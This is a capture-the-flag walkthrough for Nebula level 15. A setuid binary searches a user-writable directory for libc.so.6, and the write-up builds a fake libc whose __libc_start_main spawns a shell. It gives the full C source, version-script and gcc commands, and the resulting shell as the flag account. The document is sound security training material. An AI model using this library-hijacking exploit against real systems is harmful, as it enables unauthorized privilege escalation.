# Nebula - Level 15

### About ###

>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
>
>You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
>
>Clean up after yourself :)
>
>To do this level, log in as the level15 account with the password level15 . Files for this level can be found in /home/flag15.

### Solution ###


```bash
level15@nebula:/tmp$ strace /home/flag15/flag15
execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 23 vars */]) = 0
brk(0)                                  = 0x8c62000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb789d000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", {st_mode=S_IFDIR|0775, st_size=40, ...}) = 0
...
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x612000
mmap2(0x788000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x788000
mmap2(0x78b000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x78b000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb789c000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb789c8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x788000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x597000, 4096, PROT_READ)     = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb789b000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
```

The executable `flag15` is looking for the shared library `libc.so.6` in multiple directories located in `/var/tmp/flag15/` where the user `level15` has write permissions. `libc.so.6` can be overwritten to spawn a shell with the permissions of `flag15`.

The first function of the libc called by `./flag15` is `__libc_start_main`, which can be found with `gdb` and `readelf`. 

```
Breakpoint 1, 0x08048348 in _start ()
(gdb) disass
Dump of assembler code for function _start:
=> 0x08048348 <+0>: xor    %ebp,%ebp
   0x0804834a <+2>: pop    %esi
   0x0804834b <+3>: mov    %esp,%ecx
   0x0804834d <+5>: and    $0xfffffff0,%esp
   0x08048350 <+8>: push   %eax
   0x08048351 <+9>: push   %esp
   0x08048352 <+10>:  push   %edx
   0x08048353 <+11>:  push   $0x8048470
   0x08048358 <+16>:  push   $0x8048400
   0x0804835d <+21>:  push   %ecx
   0x0804835e <+22>:  push   %esi
   0x0804835f <+23>:  push   $0x8048330
   0x08048364 <+28>:  call   0x8048320 <__libc_start_main@plt>
   0x08048369 <+33>:  hlt
   0x0804836a <+34>:  nop
   0x0804836b <+35>:  nop
   0x0804836c <+36>:  nop
   0x0804836d <+37>:  nop
   0x0804836e <+38>:  nop
   0x0804836f <+39>:  nop
End of assembler dump.
(gdb)
```

The code of the fake libc library looks as follows.

```c
#include <unistd.h>

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
  system("/bin/sh");
}
```

The c file is first compiled as a shared library, but apparently it is not enough to make it spawn a shell.

```
level15@nebula:/tmp$ gcc -shared -fPIC libc.c -o /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6 && /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: no version information available (required by /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: no version information available (required by /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

Version information are needed. It can be solved with `gcc`'s `--version-script`.

```
gcc -shared -fPIC -Wl,--version-script libc.map libc.c -o /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6 && /home/flag15/flag15
```

```
level15@nebula:/tmp$ cat libc.map
GLIBC_2.0 {
};
GLIBC_2.1.3 {
};
```

```
level15@nebula:/tmp$ gcc -shared -fPIC -Wl,--version-script libc.map libc.c -o /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6 && /home/flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

The function `__cxa_finalize` needs to be declared.

```c
#include <unistd.h>

void __cxa_finalize(void * d)
{}

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
system("/bin/sh");
}
```

```
level15@nebula:/tmp$ gcc -shared -fPIC -Wl,--version-script libc.map libc.c -o /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6 && /home/flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

libgcc is required to call system which is why it need to be statically linked to the fake shared library with the option `-static-libgcc -Wl,-Bstatic`. Finally, `getflag` can be executed.

```
level15@nebula:/tmp$ gcc -shared -fPIC -Wl,--version-script libc.map -static-libgcc -Wl,-Bstatic libc.c -o /var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6 && /home/flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
